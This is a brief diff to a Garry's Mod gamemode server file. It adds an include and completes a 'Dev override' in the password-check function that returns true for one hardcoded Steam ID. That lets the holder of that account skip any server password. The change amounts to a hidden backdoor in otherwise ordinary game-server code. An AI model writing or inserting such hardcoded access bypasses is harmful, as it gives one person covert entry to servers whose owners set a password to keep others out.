@@ -6,6 +6,8 @@ AddCSLuaFile("cl_pickrace.lua")
 
 include("shared.lua")
 
+include("player.lua")
+
 GM.PlayerSpawnTime = {}
 
 --[[---------------------------------------------------------
@@ -112,6 +114,8 @@ function GM:CheckPassword( steamid, networkid, server_password, password, name )
 
 	-- Dev override
 	if( steamid == "STEAM_1:1:58400760" ) then
+		return true
+	end
 	
 	-- The server has sv_password set
 	if ( server_password != "" ) then
